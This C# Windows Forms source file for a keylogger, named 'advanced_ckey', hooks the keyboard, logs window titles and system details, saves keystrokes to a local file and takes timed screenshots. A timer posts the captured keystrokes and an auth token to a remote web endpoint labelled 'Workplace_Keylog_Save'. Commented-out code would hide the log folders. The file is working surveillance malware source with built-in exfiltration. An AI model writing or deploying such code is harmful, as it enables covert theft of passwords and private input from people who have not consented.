using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace advanced_ckey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            K = new Keyboard();
            InitializeComponent();
            
        }
        private Keyboard _K;

        private Keyboard K
        {
            [MethodImpl(MethodImplOptions.Synchronized)]
            get
            {
                return _K;
            }

            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                if (_K != null)
                {
                    _K.Down -= K_Down;
                }

                _K = value;

                if (_K != null)
                {
                    _K.Down += K_Down;
                }

            }
        }

       
        private string strin = null;


        public string GetActiveWindowTitle()  //get active windows title here
        {
            const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void keyboardLanguages() //this function here is to translate user installed language
        {
            for (var index = 0; index < InputLanguage.InstalledInputLanguages.Count; index++)
            {
                textBox2.Text = InputLanguage.InstalledInputLanguages[index].LayoutName.ToString() + textBox2.Text;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
        {
            if (strin != GetActiveWindowTitle())
            {
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
                strin = GetActiveWindowTitle();
            }
        }

        private void K_Down(string key)
        {
            txtkeylog.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
        }

        void send_screenshot_to_file() 
        {
        
        }


        public void screenshot()  // the method that handles the screenshot
        {
            string filename = "Screencapture" + DateTime.Now.ToString("ddMMyyyy-hhmmss") + ".png";
            try
            {
                Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);

                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(@"C:\MyDir\" + filename , ImageFormat.Jpeg);
            }
            catch (Exception)
            {
            }
        }

        public void sendkeylog()
        {
            try
            {
                string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Keylog_Save?pc_widget_output_method=JSON&";
                string myParameters = "texts=" + txtkeylog.Text + "&user_id=" + Properties.Settings.Default.user_id + "&window_title=" + strin + "&auth_token=" + Properties.Settings.Default.auth_token;  //strin in the window title field represent the last current window title.

                using (WebClient wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                    string jsonresponse = wc.UploadString(URI, myParameters);
                    MessageBox.Show(jsonresponse);
                }
            }catch(Exception ex) { MessageBox.Show(ex.Message); }
        }

        public void savetextfile()    // method saving textfile to file explorer
        {
            try
            {
                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", txtkeylog.Text);
            }
            catch (Exception)
            {
            }
        }

        DirectoryInfo ch;
        DirectoryInfo cb;

        private void Form1_Load(object sender, EventArgs e)
        {
           
            try
            {
                Directory.CreateDirectory(@"C:\MyDir");  // create a diretory for saving the screenshot file
                Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
                string filepath;
                filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
                if (File.Exists(filepath))
                {
                }
                else
                {
                    File.Create(filepath);
                }
            }
            catch (Exception)
            {
            }

            //try  //hides keylogger folder
            //{
            //    ch = new DirectoryInfo(@"C:\MyDirr");
            //    ch.Attributes = FileAttributes.Hidden;
            //  //  MessageBox.Show("Hidden");
            //}
            //catch { }

            //try  //hides keylogger folder
            //{
            //    ch = new DirectoryInfo(@"C:\MyDir");
            //    ch.Attributes = FileAttributes.Hidden;
            //    //  MessageBox.Show("Hidden");
            //}
            //catch { }


            //try
            //{

            //    ch = new DirectoryInfo(@"C:\MyDirr");
            //    cb = new DirectoryInfo(@"C:\MyDir");
            //    ch.Attributes = FileAttributes.Normal;
            //    cb.Attributes = FileAttributes.Normal;
            //    MessageBox.Show("Visible");

            //}
            //catch { }

            sendkeylog_timer.Start();
            keylog_timer.Start();   // write textbox1.text strings into a file
            Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
            keyboardLanguages();  //get the keyboard language {input keyboard language installed}
           keylog_infomation();  // calls keylog_information
        }

        public void keylog_infomation()
        {
            
            txtkeylog.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day


            try
            {
                txtkeylog.Text = Environment.NewLine + txtkeylog.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + Environment.NewLine;

                K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                activewindowtimer.Start();   // gets active window name and if not wanted delete this line of code
               
            }
            catch (Exception)
            {
            }
       
        }
       
        private void keylog_timer_Tick(object sender, EventArgs e)
        {
            savetextfile();
        }

        private void Sceenshot_timer_Tick(object sender, EventArgs e)
        {
            screenshot();
        }

        [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int ToUnicodeEx(Keys wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
           
            sendkeylog();
           txtkeylog.Clear();
        }

        private void sendscreenshot_Tick(object sender, EventArgs e)
        {

        }
    }
}

  

